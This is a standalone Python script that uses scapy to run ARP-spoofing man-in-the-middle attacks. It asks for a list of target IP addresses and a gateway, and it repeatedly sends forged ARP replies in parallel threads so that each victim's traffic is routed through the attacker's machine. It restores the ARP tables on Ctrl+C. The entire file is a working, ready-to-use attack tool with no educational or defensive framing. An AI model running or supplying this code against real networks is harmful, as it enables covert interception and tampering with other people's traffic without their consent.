import scapy.all as scapy
import time
import sys
import concurrent.futures

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_target_mac(target_ip):
    try:
        target_mac = get_mac(target_ip)
        return target_mac
    except IndexError:
        print(f"[-] Could not find MAC address of {target_ip}. Exiting.")
        sys.exit(1)

def mitm(target_ip, gateway_ip):
    target_mac = get_target_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if target_mac is None:
        print(f"[-] Could not find MAC address of {target_ip}. Exiting.")
        sys.exit(1)
        
    try:
        while True:
            # ARP spoofing the target
            spoof(target_ip, gateway_ip, target_mac)
            
            # ARP spoofing the gateway
            spoof(gateway_ip, target_ip, gateway_mac)
            
            print(f"\r[+] Sent spoofed ARP packets to {target_ip} and {gateway_ip}"),
            sys.stdout.flush()
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected Ctrl+C. Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[+] ARP tables restored. Exiting.")

def run_mitm(target_ips, gateway_ip):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(mitm, target, gateway_ip) for target in target_ips]

        try:
            # Wait for all threads to complete
            concurrent.futures.wait(futures)
        except KeyboardInterrupt:
            # Handle Ctrl+C
            print("\n[+] Detected Ctrl+C. Stopping all MITM threads...")
            for future in futures:
                future.cancel()

if __name__ == "__main__":
    # Get user input for target IP addresses and gateway IP
    target_ips_str = input("Enter target IP addresses (comma-separated): ")
    target_ips = [ip.strip() for ip in target_ips_str.split(',')]
    gateway_ip = input("Enter the gateway IP: ")

    run_mitm(target_ips, gateway_ip)
